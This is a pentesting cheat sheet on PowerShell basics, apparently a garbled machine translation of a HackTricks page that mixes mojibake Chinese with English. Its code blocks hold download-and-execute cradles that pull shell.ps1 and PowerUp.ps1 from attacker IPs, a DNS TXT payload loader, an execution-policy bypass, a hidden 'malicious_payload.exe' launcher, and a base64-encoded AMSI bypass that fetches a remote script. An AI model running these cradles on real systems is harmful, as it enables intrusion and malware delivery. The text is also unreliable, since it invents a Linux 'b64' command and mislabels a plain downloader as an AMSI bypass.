# Pentestersçš„åŸºæœ¬PowerShell

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## é»˜è®¤çš„PowerShellä½ç½®
```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
## å¼€å§‹çš„åŸºæœ¬PSå‘½ä»¤

Here are some basic PowerShell commands to get started:

ä»¥ä¸‹æ˜¯ä¸€äº›åŸºæœ¬çš„PowerShellå‘½ä»¤ï¼Œä¾›æ‚¨å¼€å§‹ä½¿ç”¨ï¼š

### Get-Command

Get-Command is used to retrieve a list of available commands in PowerShell.

Get-Command ç”¨äºæ£€ç´¢PowerShellä¸­å¯ç”¨çš„å‘½ä»¤åˆ—è¡¨ã€‚

### Get-Help

Get-Help is used to display the help information for a specific command.

Get-Help ç”¨äºæ˜¾ç¤ºç‰¹å®šå‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯ã€‚

### Get-Process

Get-Process is used to retrieve a list of running processes on the system.

Get-Process ç”¨äºæ£€ç´¢ç³»ç»Ÿä¸Šæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹åˆ—è¡¨ã€‚

### Get-Service

Get-Service is used to retrieve a list of services running on the system.

Get-Service ç”¨äºæ£€ç´¢ç³»ç»Ÿä¸Šæ­£åœ¨è¿è¡Œçš„æœåŠ¡åˆ—è¡¨ã€‚

### Get-EventLog

Get-EventLog is used to retrieve the events from the event logs on the system.

Get-EventLog ç”¨äºä»ç³»ç»Ÿçš„äº‹ä»¶æ—¥å¿—ä¸­æ£€ç´¢äº‹ä»¶ã€‚

### Get-WmiObject

Get-WmiObject is used to retrieve information from Windows Management Instrumentation (WMI) objects.

Get-WmiObject ç”¨äºä»Windowsç®¡ç†å·¥å…·ï¼ˆWMIï¼‰å¯¹è±¡ä¸­æ£€ç´¢ä¿¡æ¯ã€‚

### Get-ChildItem

Get-ChildItem is used to retrieve a list of files and directories in a specified location.

Get-ChildItem ç”¨äºæ£€ç´¢æŒ‡å®šä½ç½®çš„æ–‡ä»¶å’Œç›®å½•åˆ—è¡¨ã€‚

### Set-ExecutionPolicy

Set-ExecutionPolicy is used to set the execution policy for PowerShell scripts.

Set-ExecutionPolicy ç”¨äºè®¾ç½®PowerShellè„šæœ¬çš„æ‰§è¡Œç­–ç•¥ã€‚

### Start-Process

Start-Process is used to start a new process.

Start-Process ç”¨äºå¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹ã€‚

### Stop-Process

Stop-Process is used to stop a running process.

Stop-Process ç”¨äºåœæ­¢æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚

### Out-File

Out-File is used to send output to a file.

Out-File ç”¨äºå°†è¾“å‡ºå‘é€åˆ°æ–‡ä»¶ã€‚

### Remove-Item

Remove-Item is used to remove a file or directory.

Remove-Item ç”¨äºåˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ã€‚

### New-Item

New-Item is used to create a new file or directory.

New-Item ç”¨äºåˆ›å»ºæ–°æ–‡ä»¶æˆ–ç›®å½•ã€‚

### Copy-Item

Copy-Item is used to copy a file or directory.

Copy-Item ç”¨äºå¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•ã€‚

### Move-Item

Move-Item is used to move a file or directory.

Move-Item ç”¨äºç§»åŠ¨æ–‡ä»¶æˆ–ç›®å½•ã€‚

### Rename-Item

Rename-Item is used to rename a file or directory.

Rename-Item ç”¨äºé‡å‘½åæ–‡ä»¶æˆ–ç›®å½•ã€‚

These are just a few examples of the basic PowerShell commands you can use. PowerShell is a powerful scripting language that can be used for various purposes in a Windows environment.

è¿™äº›åªæ˜¯ä¸€äº›åŸºæœ¬çš„PowerShellå‘½ä»¤ç¤ºä¾‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨PowerShellåœ¨Windowsç¯å¢ƒä¸­è¿›è¡Œå„ç§ç”¨é€”çš„è„šæœ¬ç¼–å†™ã€‚
```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```
## ä¸‹è½½å’Œæ‰§è¡Œ

To download and execute a file using PowerShell, you can use the following command:

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OutputFile>; .\<OutputFile>
```

Replace `<URL>` with the URL of the file you want to download, and `<OutputFile>` with the desired name for the downloaded file.

ä½¿ç”¨PowerShellä¸‹è½½å’Œæ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OutputFile>; .\<OutputFile>
```

å°†`<URL>`æ›¿æ¢ä¸ºè¦ä¸‹è½½çš„æ–‡ä»¶çš„URLï¼Œå°†`<OutputFile>`æ›¿æ¢ä¸ºä¸‹è½½æ–‡ä»¶çš„æ‰€éœ€åç§°ã€‚

## Execute PowerShell Script from Memory

To execute a PowerShell script from memory, you can use the following command:

```powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```

Replace `<URL>` with the URL of the script you want to execute.

ä»å†…å­˜ä¸­æ‰§è¡ŒPowerShellè„šæœ¬ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```

å°†`<URL>`æ›¿æ¢ä¸ºè¦æ‰§è¡Œçš„è„šæœ¬çš„URLã€‚

## Execute Encoded PowerShell Script

To execute an encoded PowerShell script, you can use the following command:

```powershell
powershell.exe -EncodedCommand <EncodedScript>
```

Replace `<EncodedScript>` with the base64-encoded version of the script you want to execute.

æ‰§è¡Œç¼–ç çš„PowerShellè„šæœ¬ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
powershell.exe -EncodedCommand <EncodedScript>
```

å°†`<EncodedScript>`æ›¿æ¢ä¸ºè¦æ‰§è¡Œçš„è„šæœ¬çš„base64ç¼–ç ç‰ˆæœ¬ã€‚

## Execute PowerShell Script without Execution Policy

To execute a PowerShell script without the execution policy restrictions, you can use the following command:

```powershell
powershell.exe -ExecutionPolicy Bypass -File <ScriptFile>
```

Replace `<ScriptFile>` with the path to the script file you want to execute.

åœ¨æ²¡æœ‰æ‰§è¡Œç­–ç•¥é™åˆ¶çš„æƒ…å†µä¸‹æ‰§è¡ŒPowerShellè„šæœ¬ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
powershell.exe -ExecutionPolicy Bypass -File <ScriptFile>
```

å°†`<ScriptFile>`æ›¿æ¢ä¸ºè¦æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶çš„è·¯å¾„ã€‚

## Execute PowerShell Command as a Different User

To execute a PowerShell command as a different user, you can use the following command:

```powershell
Start-Process powershell.exe -Credential <Username> -ArgumentList '-Command "<Command>"'
```

Replace `<Username>` with the username of the desired user and `<Command>` with the PowerShell command you want to execute.

ä»¥ä¸åŒç”¨æˆ·èº«ä»½æ‰§è¡ŒPowerShellå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```powershell
Start-Process powershell.exe -Credential <Username> -ArgumentList '-Command "<Command>"'
```

å°†`<Username>`æ›¿æ¢ä¸ºæ‰€éœ€ç”¨æˆ·çš„ç”¨æˆ·åï¼Œå°†`<Command>`æ›¿æ¢ä¸ºè¦æ‰§è¡Œçš„PowerShellå‘½ä»¤ã€‚
```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
### ä½¿ç”¨ AMSI Bypass åå°ä¸‹è½½å’Œæ‰§è¡Œ

```powershell
$URL = "http://example.com/malicious_payload.exe"
$Output = "C:\Temp\malicious_payload.exe"

# åˆ›å»ºä¸€ä¸ª WebClient å¯¹è±¡
$WebClient = New-Object System.Net.WebClient

# ä¸‹è½½æ¶æ„è½½è·
$WebClient.DownloadFile($URL, $Output)

# æ‰§è¡Œæ¶æ„è½½è·
Start-Process -FilePath $Output -WindowStyle Hidden
```

è¿™ä¸ªè„šæœ¬ä½¿ç”¨äº† AMSI Bypass æŠ€æœ¯ï¼Œåœ¨åå°ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„è½½è·ã€‚

```powershell
$URL = "http://example.com/malicious_payload.exe"
$Output = "C:\Temp\malicious_payload.exe"

# Create a WebClient object
$WebClient = New-Object System.Net.WebClient

# Download the malicious payload
$WebClient.DownloadFile($URL, $Output)

# Execute the malicious payload
Start-Process -FilePath $Output -WindowStyle Hidden
```

This script uses AMSI Bypass technique to download and execute a malicious payload in the background.
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
### åœ¨Linuxä¸­ä½¿ç”¨b64

The `b64` command in Linux is used to encode and decode Base64 data. It is a useful tool for manipulating and working with data in Base64 format.

To encode a file using `b64`, you can use the following command:

```bash
b64 -e <input_file> > <output_file>
```

This command will take the contents of the `<input_file>`, encode it in Base64, and save the encoded data in the `<output_file>`.

To decode a file using `b64`, you can use the following command:

```bash
b64 -d <input_file> > <output_file>
```

This command will take the contents of the `<input_file>`, decode it from Base64, and save the decoded data in the `<output_file>`.

You can also use `b64` to encode or decode data directly from the command line. For example, to encode a string, you can use the following command:

```bash
echo -n "Hello, World!" | b64 -e
```

This command will encode the string "Hello, World!" in Base64 and print the encoded data to the console.

Similarly, to decode a Base64 string, you can use the following command:

```bash
echo -n "SGVsbG8sIFdvcmxkIQ==" | b64 -d
```

This command will decode the Base64 string "SGVsbG8sIFdvcmxkIQ==" and print the decoded data to the console.

Using the `b64` command in Linux can be helpful for various tasks, such as encoding or decoding data for transmission or storage.
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
## ä¸‹è½½

### System.Net.WebClient

æ‚¨å¯ä»¥ä½¿ç”¨`System.Net.WebClient`ç±»åœ¨PowerShellä¸­è¿›è¡Œæ–‡ä»¶ä¸‹è½½ã€‚è¿™ä¸ªç±»æä¾›äº†ä¸€äº›æ–¹æ³•æ¥ä¸‹è½½æ–‡ä»¶å¹¶ä¿å­˜åˆ°æœ¬åœ°è®¡ç®—æœºä¸Šã€‚

#### DownloadFile æ–¹æ³•

`DownloadFile`æ–¹æ³•ç”¨äºä¸‹è½½æ–‡ä»¶å¹¶ä¿å­˜åˆ°æŒ‡å®šçš„è·¯å¾„ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨`DownloadFile`æ–¹æ³•çš„ç¤ºä¾‹ä»£ç ï¼š

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://example.com/file.txt"
$filePath = "C:\path\to\save\file.txt"

$webClient.DownloadFile($url, $filePath)
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª`System.Net.WebClient`å¯¹è±¡ï¼Œå¹¶æŒ‡å®šäº†è¦ä¸‹è½½çš„æ–‡ä»¶çš„URLå’Œè¦ä¿å­˜çš„æ–‡ä»¶è·¯å¾„ã€‚ç„¶åï¼Œæˆ‘ä»¬è°ƒç”¨`DownloadFile`æ–¹æ³•æ¥æ‰§è¡Œä¸‹è½½æ“ä½œã€‚

#### DownloadData æ–¹æ³•

`DownloadData`æ–¹æ³•ç”¨äºä¸‹è½½æ–‡ä»¶å¹¶å°†å…¶ä½œä¸ºå­—èŠ‚æ•°ç»„è¿”å›ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨`DownloadData`æ–¹æ³•çš„ç¤ºä¾‹ä»£ç ï¼š

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://example.com/file.txt"

$fileData = $webClient.DownloadData($url)
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª`System.Net.WebClient`å¯¹è±¡ï¼Œå¹¶æŒ‡å®šäº†è¦ä¸‹è½½çš„æ–‡ä»¶çš„URLã€‚ç„¶åï¼Œæˆ‘ä»¬è°ƒç”¨`DownloadData`æ–¹æ³•æ¥æ‰§è¡Œä¸‹è½½æ“ä½œï¼Œå¹¶å°†ä¸‹è½½çš„æ–‡ä»¶æ•°æ®ä¿å­˜åœ¨`$fileData`å˜é‡ä¸­ã€‚

#### DownloadString æ–¹æ³•

`DownloadString`æ–¹æ³•ç”¨äºä¸‹è½½æ–‡ä»¶å¹¶å°†å…¶ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨`DownloadString`æ–¹æ³•çš„ç¤ºä¾‹ä»£ç ï¼š

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://example.com/file.txt"

$fileContent = $webClient.DownloadString($url)
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª`System.Net.WebClient`å¯¹è±¡ï¼Œå¹¶æŒ‡å®šäº†è¦ä¸‹è½½çš„æ–‡ä»¶çš„URLã€‚ç„¶åï¼Œæˆ‘ä»¬è°ƒç”¨`DownloadString`æ–¹æ³•æ¥æ‰§è¡Œä¸‹è½½æ“ä½œï¼Œå¹¶å°†ä¸‹è½½çš„æ–‡ä»¶å†…å®¹ä¿å­˜åœ¨`$fileContent`å˜é‡ä¸­ã€‚

#### ä½¿ç”¨ä»£ç†æœåŠ¡å™¨

å¦‚æœæ‚¨éœ€è¦é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿›è¡Œä¸‹è½½ï¼Œå¯ä»¥ä½¿ç”¨`Proxy`å±æ€§æ¥è®¾ç½®ä»£ç†æœåŠ¡å™¨çš„åœ°å€ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨ä»£ç†æœåŠ¡å™¨è¿›è¡Œä¸‹è½½çš„ç¤ºä¾‹ä»£ç ï¼š

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://example.com/file.txt"
$proxyAddress = "http://proxy.example.com:8080"

$webClient.Proxy = New-Object System.Net.WebProxy($proxyAddress)

$webClient.DownloadFile($url, $filePath)
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª`System.Net.WebClient`å¯¹è±¡ï¼Œå¹¶æŒ‡å®šäº†è¦ä¸‹è½½çš„æ–‡ä»¶çš„URLã€‚ç„¶åï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª`System.Net.WebProxy`å¯¹è±¡ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™`Proxy`å±æ€§ï¼Œä»¥è®¾ç½®ä»£ç†æœåŠ¡å™¨çš„åœ°å€ã€‚æœ€åï¼Œæˆ‘ä»¬è°ƒç”¨`DownloadFile`æ–¹æ³•æ¥æ‰§è¡Œä¸‹è½½æ“ä½œã€‚

#### å¼‚æ­¥ä¸‹è½½

å¦‚æœæ‚¨éœ€è¦åœ¨åå°æ‰§è¡Œä¸‹è½½æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨`DownloadFileAsync`ã€`DownloadDataAsync`å’Œ`DownloadStringAsync`æ–¹æ³•ã€‚è¿™äº›æ–¹æ³•å°†åœ¨åå°çº¿ç¨‹ä¸­æ‰§è¡Œä¸‹è½½æ“ä½œï¼Œå¹¶åœ¨ä¸‹è½½å®Œæˆæ—¶è§¦å‘ç›¸åº”çš„äº‹ä»¶ã€‚

ä»¥ä¸‹æ˜¯ä½¿ç”¨`DownloadFileAsync`æ–¹æ³•çš„ç¤ºä¾‹ä»£ç ï¼š

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://example.com/file.txt"
$filePath = "C:\path\to\save\file.txt"

$webClient.DownloadFileAsync($url, $filePath)
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª`System.Net.WebClient`å¯¹è±¡ï¼Œå¹¶æŒ‡å®šäº†è¦ä¸‹è½½çš„æ–‡ä»¶çš„URLå’Œè¦ä¿å­˜çš„æ–‡ä»¶è·¯å¾„ã€‚ç„¶åï¼Œæˆ‘ä»¬è°ƒç”¨`DownloadFileAsync`æ–¹æ³•æ¥æ‰§è¡Œå¼‚æ­¥ä¸‹è½½æ“ä½œã€‚

#### æ³¨æ„äº‹é¡¹

åœ¨ä½¿ç”¨`System.Net.WebClient`ç±»è¿›è¡Œæ–‡ä»¶ä¸‹è½½æ—¶ï¼Œè¯·æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

- è¯·ç¡®ä¿æ‚¨æœ‰åˆæ³•çš„æƒé™æ¥ä¸‹è½½æ–‡ä»¶ã€‚
- è¯·ç¡®ä¿æ‚¨ä¸‹è½½çš„æ–‡ä»¶æ˜¯åˆæ³•å’Œå®‰å…¨çš„ã€‚
- è¯·éµå®ˆé€‚ç”¨çš„æ³•å¾‹å’Œè§„å®šã€‚

ä»¥ä¸Šæ˜¯ä½¿ç”¨`System.Net.WebClient`ç±»åœ¨PowerShellä¸­è¿›è¡Œæ–‡ä»¶ä¸‹è½½çš„åŸºæœ¬æ–¹æ³•ã€‚æ‚¨å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚é€‰æ‹©é€‚åˆçš„æ–¹æ³•æ¥ä¸‹è½½æ–‡ä»¶ã€‚
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
### Invoke-WebRequest

`Invoke-WebRequest` æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ PowerShell cmdletï¼Œç”¨äºåœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œ HTTP è¯·æ±‚ã€‚å®ƒå¯ä»¥ç”¨äºä¸ Web æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œå‘é€ GETã€POST å’Œå…¶ä»–ç±»å‹çš„è¯·æ±‚ï¼Œå¹¶æ¥æ”¶æœåŠ¡å™¨çš„å“åº”ã€‚

#### è¯­æ³•

```powershell
Invoke-WebRequest [-Uri] <string> [-Method <string>] [-Headers <hashtable>] [-Body <string>] [-ContentType <string>] [-UserAgent <string>] [-Proxy <Uri>] [-ProxyCredential <PSCredential>] [-TimeoutSec <int>] [-SessionVariable <string>] [-WebSession <WebRequestSession>] [-UseBasicParsing] [<CommonParameters>]
```

#### å‚æ•°

- `-Uri`ï¼šæŒ‡å®šè¦è¯·æ±‚çš„ URLã€‚
- `-Method`ï¼šæŒ‡å®šè¯·æ±‚çš„æ–¹æ³•ï¼Œå¦‚ GETã€POST ç­‰ã€‚é»˜è®¤ä¸º GETã€‚
- `-Headers`ï¼šæŒ‡å®šè¯·æ±‚çš„å¤´éƒ¨ä¿¡æ¯ã€‚
- `-Body`ï¼šæŒ‡å®šè¯·æ±‚çš„ä¸»ä½“å†…å®¹ã€‚
- `-ContentType`ï¼šæŒ‡å®šè¯·æ±‚çš„å†…å®¹ç±»å‹ã€‚
- `-UserAgent`ï¼šæŒ‡å®šè¯·æ±‚çš„ç”¨æˆ·ä»£ç†ã€‚
- `-Proxy`ï¼šæŒ‡å®šä»£ç†æœåŠ¡å™¨çš„ URLã€‚
- `-ProxyCredential`ï¼šæŒ‡å®šä»£ç†æœåŠ¡å™¨çš„å‡­æ®ã€‚
- `-TimeoutSec`ï¼šæŒ‡å®šè¯·æ±‚çš„è¶…æ—¶æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚
- `-SessionVariable`ï¼šæŒ‡å®šå°†å“åº”ä¿å­˜åˆ°çš„å˜é‡ã€‚
- `-WebSession`ï¼šæŒ‡å®šè¦ä½¿ç”¨çš„ Web ä¼šè¯ã€‚
- `-UseBasicParsing`ï¼šä½¿ç”¨åŸºæœ¬è§£æå™¨æ¥è§£æ HTML å“åº”ã€‚

#### ç¤ºä¾‹

å‘é€ GET è¯·æ±‚ï¼š

```powershell
Invoke-WebRequest -Uri "https://example.com"
```

å‘é€ POST è¯·æ±‚ï¼š

```powershell
Invoke-WebRequest -Uri "https://example.com" -Method POST -Body "param1=value1&param2=value2"
```

å‘é€å¸¦æœ‰è‡ªå®šä¹‰å¤´éƒ¨çš„è¯·æ±‚ï¼š

```powershell
$headers = @{
    "Authorization" = "Bearer token123"
    "Content-Type" = "application/json"
}

Invoke-WebRequest -Uri "https://example.com" -Headers $headers
```

#### æ³¨æ„äº‹é¡¹

- `Invoke-WebRequest` é»˜è®¤ä½¿ç”¨ IE è§£æå™¨æ¥è§£æ HTML å“åº”ã€‚å¦‚æœé‡åˆ°è§£æé—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨ `-UseBasicParsing` å‚æ•°æ¥ä½¿ç”¨åŸºæœ¬è§£æå™¨ã€‚
- `Invoke-WebRequest` å¯ä»¥ä¸ `Invoke-RestMethod` ç»“åˆä½¿ç”¨ï¼Œç”¨äºå¤„ç† RESTful API è¯·æ±‚å’Œå“åº”ã€‚
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
### Wget

Wget is a command-line utility that allows you to download files from the web. It supports downloading files using various protocols such as HTTP, HTTPS, and FTP. Wget is commonly used in scripting and automation tasks.

To use Wget, you need to open a command prompt or terminal and enter the following command:

```
wget [options] [URL]
```

Here are some commonly used options:

- `-O`: Specifies the output file name.
- `-P`: Specifies the directory where the downloaded file will be saved.
- `-c`: Resumes a previous download if it was interrupted.
- `-r`: Recursively downloads files from a specified URL.
- `-np`: Limits the recursion to the same directory level.
- `-A`: Specifies a comma-separated list of file extensions to accept during download.
- `-U`: Specifies the user agent string to send to the server.

For example, to download a file named `example.txt` from a website, you can use the following command:

```
wget -O example.txt http://www.example.com/file.txt
```

This will download the file and save it as `example.txt` in the current directory.

Wget is a powerful tool that can be used for various purposes, such as downloading files for analysis, scraping websites, or automating repetitive tasks.
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

BitsTransfer æ˜¯ä¸€ç§åœ¨ Windows æ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨ PowerShell è¿›è¡Œæ–‡ä»¶ä¼ è¾“çš„å·¥å…·ã€‚å®ƒå…è®¸ä½ é€šè¿‡ HTTP æˆ– HTTPS åè®®ä»è¿œç¨‹æœåŠ¡å™¨ä¸‹è½½æ–‡ä»¶ï¼Œå¹¶ä¸”æ”¯æŒæ–­ç‚¹ç»­ä¼ åŠŸèƒ½ã€‚BitsTransfer æ˜¯ä¸€ç§éå¸¸æœ‰ç”¨çš„å·¥å…·ï¼Œç‰¹åˆ«é€‚ç”¨äºåœ¨æ¸—é€æµ‹è¯•ä¸­è·å–ç›®æ ‡ç³»ç»Ÿä¸Šçš„æ•æ„Ÿæ–‡ä»¶ã€‚

#### ä¸‹è½½æ–‡ä»¶

ä½ å¯ä»¥ä½¿ç”¨ `Start-BitsTransfer` å‘½ä»¤æ¥ä¸‹è½½æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š

```powershell
Start-BitsTransfer -Source http://example.com/file.txt -Destination C:\path\to\save\file.txt
```

åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ `Start-BitsTransfer` å‘½ä»¤ä» `http://example.com/file.txt` ä¸‹è½½æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¿å­˜åˆ°æœ¬åœ°çš„ `C:\path\to\save\file.txt` è·¯å¾„ä¸‹ã€‚

#### æ–­ç‚¹ç»­ä¼ 

BitsTransfer æ”¯æŒæ–­ç‚¹ç»­ä¼ åŠŸèƒ½ï¼Œè¿™æ„å‘³ç€å¦‚æœä¸‹è½½è¿‡ç¨‹ä¸­å‡ºç°ä¸­æ–­ï¼Œä½ å¯ä»¥åœ¨æ¢å¤ä¸‹è½½æ—¶ä»ä¸­æ–­çš„ä½ç½®ç»§ç»­ä¸‹è½½ã€‚è¿™å¯¹äºå¤§æ–‡ä»¶çš„ä¸‹è½½éå¸¸æœ‰ç”¨ã€‚

è¦å¯ç”¨æ–­ç‚¹ç»­ä¼ åŠŸèƒ½ï¼Œä½ éœ€è¦ä½¿ç”¨ `-TransferType` å‚æ•°å¹¶å°†å…¶è®¾ç½®ä¸º `Recover`ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š

```powershell
Start-BitsTransfer -Source http://example.com/largefile.zip -Destination C:\path\to\save\largefile.zip -TransferType Recover
```

